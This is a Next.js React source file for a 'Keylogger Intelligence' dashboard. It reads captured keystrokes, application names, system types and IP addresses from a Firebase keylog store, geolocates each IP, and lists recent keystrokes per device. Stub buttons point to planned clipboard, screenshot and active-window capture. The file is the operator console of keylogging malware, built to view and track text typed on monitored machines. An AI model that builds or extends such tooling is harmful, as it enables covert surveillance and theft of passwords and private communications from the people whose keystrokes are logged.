'use client';

import { useState, useEffect } from 'react';
import { database, auth } from '@/firebase/config';
import { ref, onValue } from 'firebase/database';
import { signInAnonymously } from 'firebase/auth';
import Link from 'next/link';

// Enum for system types
enum SystemType {
  Windows = 'Windows',
  MacOS = 'macOS',
  Linux = 'Linux',
  Kali = 'Kali Linux',
  Arch = 'Arch Linux',
  Fedora = 'Fedora',
  Ubuntu = 'Ubuntu',
  Unknown = 'Unknown'
}

// Interface to include system type and IP
interface LogEntry {
  timestamp: string;
  keystroke: string;
  app: string;
  systemType: SystemType;
  ipAddress: string;
  location?: {
    country: string;
    city?: string;
  };
}

// Mapping function to detect system type
function detectSystemType(systemInfo: string): SystemType {
  const lowercaseInfo = systemInfo.toLowerCase();
  
  if (lowercaseInfo.includes('windows')) return SystemType.Windows;
  if (lowercaseInfo.includes('mac')) return SystemType.MacOS;
  if (lowercaseInfo.includes('kali')) return SystemType.Kali;
  if (lowercaseInfo.includes('arch')) return SystemType.Arch;
  if (lowercaseInfo.includes('fedora')) return SystemType.Fedora;
  if (lowercaseInfo.includes('ubuntu')) return SystemType.Ubuntu;
  if (lowercaseInfo.includes('linux')) return SystemType.Linux;
  
  return SystemType.Unknown;
}

// System icons mapping
const SystemIcons: { [key in SystemType]: string } = {
  [SystemType.Windows]: '💻',
  [SystemType.MacOS]: '🍎',
  [SystemType.Linux]: '🐧',
  [SystemType.Kali]: '🔪',
  [SystemType.Arch]: '🏹',
  [SystemType.Fedora]: '🦊',
  [SystemType.Ubuntu]: '🟠',
  [SystemType.Unknown]: '❓'
};

export default function Dashboard() {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [selectedSystem, setSelectedSystem] = useState<SystemType | null>(null);
  const [selectedIp, setSelectedIp] = useState<string | null>(null);
  const [stats, setStats] = useState({
    totalLogs: 0,
    uniqueApps: new Set<string>(),
    uniqueSystems: new Set<SystemType>(),
    uniqueIPs: new Set<string>(),
    lastLogTimestamp: ''
  });

  // Fetch IP geolocation
  const fetchIPLocation = async (ip: string) => {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      return {
        country: data.country_name || 'Unknown',
        city: data.city || 'Unknown'
      };
    } catch (error) {
      console.error('Error fetching IP location:', error);
      return { country: 'Unknown', city: 'Unknown' };
    }
  };

  useEffect(() => {
    const authenticate = async () => {
      try {
        const userCredential = await signInAnonymously(auth);
        const deviceId = userCredential.user.uid;

        const logsRef = ref(database, `keylog/${deviceId}`);

        const unsubscribe = onValue(logsRef, async (snapshot) => {
          const data = snapshot.val();
          if (data) {
            const logEntries = await Promise.all(
              Object.values(data).flatMap(
                (appLogs: any) => Object.values(appLogs).map(async (log: any) => {
                  const location = await fetchIPLocation(log.ipAddress || '');
                  return {
                    ...log,
                    systemType: detectSystemType(log.app || ''),
                    location
                  };
                })
              )
            );
            
            setLogs(logEntries);
            
            // Update stats
            setStats({
              totalLogs: logEntries.length,
              uniqueApps: new Set(logEntries.map((log: LogEntry) => log.app)),
              uniqueSystems: new Set(logEntries.map((log: LogEntry) => log.systemType)),
              uniqueIPs: new Set(logEntries.map((log: LogEntry) => log.ipAddress)),
              lastLogTimestamp: logEntries[logEntries.length - 1]?.timestamp || ''
            });
          }
        });

        return () => unsubscribe();
      } catch (error) {
        console.error('Authentication error:', error);
      }
    };

    authenticate();
  }, []);

  // Interactive system options
  const SystemOptionsModal = () => {
    if (!selectedSystem) return null;

    return (
      <div className="fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
        <div className="bg-gray-800 rounded-2xl p-8 max-w-md w-full">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold">
              {SystemIcons[selectedSystem]} {selectedSystem} Options
            </h2>
            <button 
              onClick={() => setSelectedSystem(null)}
              className="text-red-500 hover:bg-red-500/20 rounded-full p-2"
            >
              ❌
            </button>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <button className="bg-blue-600 hover:bg-blue-700 p-4 rounded-xl flex items-center justify-center">
              📋 Clipboard Logs
            </button>
            <button className="bg-green-600 hover:bg-green-700 p-4 rounded-xl flex items-center justify-center">
              📸 Screenshots
            </button>
            <button className="bg-purple-600 hover:bg-purple-700 p-4 rounded-xl flex items-center justify-center">
              🔍 Active Windows
            </button>
            <button className="bg-red-600 hover:bg-red-700 p-4 rounded-xl flex items-center justify-center">
              🚫 Block System
            </button>
          </div>
        </div>
      </div>
    );
  };

  // Interactive IP details modal
  const IPDetailsModal = () => {
    if (!selectedIp) return null;

    const ipLog = logs.find(log => log.ipAddress === selectedIp);

    return (
      <div className="fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
        <div className="bg-gray-800 rounded-2xl p-8 max-w-md w-full">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold">
              🌐 IP Details: {selectedIp}
            </h2>
            <button 
              onClick={() => setSelectedIp(null)}
              className="text-red-500 hover:bg-red-500/20 rounded-full p-2"
            >
              ❌
            </button>
          </div>

          <div className="space-y-4">
            <div className="bg-gray-700 p-4 rounded-xl">
              <h3 className="font-semibold">📍 Location</h3>
              <p className="text-blue-300">
                {ipLog?.location?.city}, {ipLog?.location?.country}
              </p>
            </div>
            <div className="bg-gray-700 p-4 rounded-xl">
              <h3 className="font-semibold">💻 Systems Accessed</h3>
              <p className="text-green-300">
                {logs.filter(log => log.ipAddress === selectedIp)
                  .map(log => log.systemType)
                  .join(', ')}
              </p>
            </div>
            <div className="bg-gray-700 p-4 rounded-xl">
              <h3 className="font-semibold">📊 Total Logs</h3>
              <p className="text-purple-300">
                {logs.filter(log => log.ipAddress === selectedIp).length} logs
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#0f172a] via-[#1e293b] to-[#0f172a] text-white overflow-hidden relative">
      {/* Navigation Bar */}
      <nav className="fixed top-0 left-0 right-0 z-50">
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex justify-between items-center bg-gray-800/40 backdrop-blur-xl border border-gray-700/50 rounded-2xl px-6 py-3 shadow-2xl">
            {/* Logo */}
            <div className="flex items-center space-x-4">
              <div className="relative group">
                <div className="absolute -inset-0.5 bg-gradient-to-r from-purple-600 to-blue-600 rounded-xl blur-lg opacity-50 group-hover:opacity-75 transition duration-300"></div>
                <div className="relative bg-gray-900 px-6 py-2 rounded-xl border border-gray-700/50 backdrop-blur-sm">
                  <h1 className="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-blue-500 tracking-tight font-orbitron">
                    KI
                  </h1>
                </div>
              </div>
              <span className="text-xl font-medium text-gray-300 font-orbitron">
                Keylogger Intelligence
              </span>
            </div>

            {/* Social Media Links */}
            <div className="flex space-x-4">
              <Link 
                href="https://www.instagram.com/su6osec" 
                target="_blank" 
                className="text-gray-300 hover:text-pink-500 transition transform hover:scale-110"
              >
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
                  <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
                  <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
                </svg>
              </Link>
              <Link 
                href="https://github.com/su6osu" 
                target="_blank" 
                className="text-gray-300 hover:text-gray-100 transition transform hover:scale-110"
              >
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
                </svg>
              </Link>
              <Link 
                href="https://www.linkedin.com/in/su6o" 
                target="_blank" 
                className="text-gray-300 hover:text-blue-500 transition transform hover:scale-110"
              >
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
                  <rect x="2" y="9" width="4" height="12"></rect>
                  <circle cx="4" cy="4" r="2"></circle>
                </svg>
              </Link>
            </div>
          </div>
        </div>
      </nav>

      {/* Animated Particle Background */}
      <div className="absolute inset-0 overflow-hidden opacity-50 pointer-events-none">
        <div className="absolute animate-blob-1 top-[-10%] right-[-10%] w-[500px] h-[500px] bg-purple-500/20 rounded-full filter blur-3xl"></div>
        <div className="absolute animate-blob-2 bottom-[-10%] left-[-10%] w-[600px] h-[600px] bg-blue-500/20 rounded-full filter blur-3xl"></div>
      </div>

      {/* Dashboard Container */}
      <div className="relative z-10 max-w-7xl mx-auto px-4 py-12 pt-32">
        {/* Header */}
        <header className="mb-16 text-center px-4">
          <h1 className="text-5xl font-extrabold bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-blue-500 mb-6 tracking-tight leading-[1.2] px-4 md:px-0">
            Keylogger Intelligence
          </h1>
          <p className="text-lg text-gray-400 max-w-2xl mx-auto leading-relaxed px-4 md:px-0">
            Real-time monitoring and analysis of system interactions
          </p>
        </header>

        {/* Stats Grid */}
        <div className="grid md:grid-cols-4 gap-6 mb-12">
          {/* Total Logs Card */}
          <div className="bg-gray-800/40 backdrop-blur-xl border border-gray-700/50 rounded-2xl p-6 shadow-2xl transform transition hover:scale-105 hover:shadow-purple-500/30 group relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-purple-500/10 to-blue-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500 rounded-2xl"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm uppercase tracking-wider text-gray-400">Total Logs</h3>
                <div className="w-3 h-3 bg-purple-500 rounded-full animate-ping-slow"></div>
              </div>
              <div className="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-blue-500">
                {stats.totalLogs}
              </div>
            </div>
          </div>

          {/* Unique Systems Card */}
          <div className="bg-gray-800/40 backdrop-blur-xl border border-gray-700/50 rounded-2xl p-6 shadow-2xl transform transition hover:scale-105 hover:shadow-green-500/30 group relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-green-500/10 to-teal-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500 rounded-2xl"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm uppercase tracking-wider text-gray-400">Unique Systems</h3>
                <div className="w-3 h-3 bg-green-500 rounded-full animate-ping-slow"></div>
              </div>
              <div className="flex space-x-3">
                {Array.from(stats.uniqueSystems).map(system => (
                  <button 
                    key={system}
                    onClick={() => setSelectedSystem(system)}
                    className="text-3xl hover:scale-125 transition transform"
                    title={system}
                  >
                    {SystemIcons[system]}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Unique IPs Card */}
          <div className="bg-gray-800/40 backdrop-blur-xl border border-gray-700/50 rounded-2xl p-6 shadow-2xl transform transition hover:scale-105 hover:shadow-blue-500/30 group relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-blue-500/10 to-cyan-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500 rounded-2xl"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm uppercase tracking-wider text-gray-400">Unique IPs</h3>
                <div className="w-3 h-3 bg-blue-500 rounded-full animate-ping-slow"></div>
              </div>
              <div className="flex space-x-2 overflow-x-auto">
                {Array.from(stats.uniqueIPs).map(ip => (
                  <button 
                    key={ip}
                    onClick={() => setSelectedIp(ip)}
                    className="bg-gray-700/50 px-3 py-1 rounded-full hover:bg-gray-600/50 transition text-sm"
                    title={ip}
                  >
                    {ip}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Last Log Timestamp Card */}
          <div className="bg-gray-800/40 backdrop-blur-xl border border-gray-700/50 rounded-2xl p-6 shadow-2xl transform transition hover:scale-105 hover:shadow-red-500/30 group relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-red-500/10 to-orange-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500 rounded-2xl"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm uppercase tracking-wider text-gray-400">Last Log</h3>
                <div className="w-3 h-3 bg-red-500 rounded-full animate-ping-slow"></div>
              </div>
              <div className="text-sm text-gray-300">
                {stats.lastLogTimestamp || 'No logs recorded'}
              </div>
            </div>
          </div>
        </div>

        {/* Logs Table */}
        <div className="bg-gray-800/40 backdrop-blur-xl border border-gray-700/50 rounded-2xl overflow-hidden shadow-2xl">
          <table className="w-full">
            <thead className="bg-gray-700/30">
              <tr>
                {['Timestamp', 'Keystroke', 'Application', 'System', 'IP Address'].map((header, index) => (
                  <th 
                    key={header} 
                    className="p-4 text-left text-sm uppercase tracking-wider text-gray-400 border-b border-gray-700/30"
                  >
                    <div className="flex items-center">
                      <div className={`w-2.5 h-2.5 rounded-full mr-3 animate-ping-slow ${
                        ['blue-500', 'green-500', 'purple-500', 'red-500', 'cyan-500'][index]
                      }`}></div>
                      {header}
                    </div>
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {logs.slice(-10).map((log, index) => (
                <tr 
                  key={index} 
                  className="hover:bg-gray-700/20 transition duration-200 group"
                >
                  <td className="p-4 text-sm text-gray-300">{log.timestamp}</td>
                  <td className="p-4 text-sm text-blue-300">{log.keystroke}</td>
                  <td className="p-4 text-sm text-green-300">{log.app}</td>
                  <td className="p-4 text-sm text-purple-300">
                    <button 
                      onClick={() => setSelectedSystem(log.systemType)}
                      className="hover:scale-125 transition transform"
                      title={log.systemType}
                    >
                      {SystemIcons[log.systemType]}
                    </button>
                  </td>
                  <td className="p-4 text-sm text-red-300">
                    <button 
                      onClick={() => setSelectedIp(log.ipAddress)}
                      className="hover:underline transition"
                      title="View IP Details"
                    >
                      {log.ipAddress}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* System Options Modal */}
      {selectedSystem && <SystemOptionsModal />}

      {/* IP Details Modal */}
      {selectedIp && <IPDetailsModal />}
    </div>
  );
} 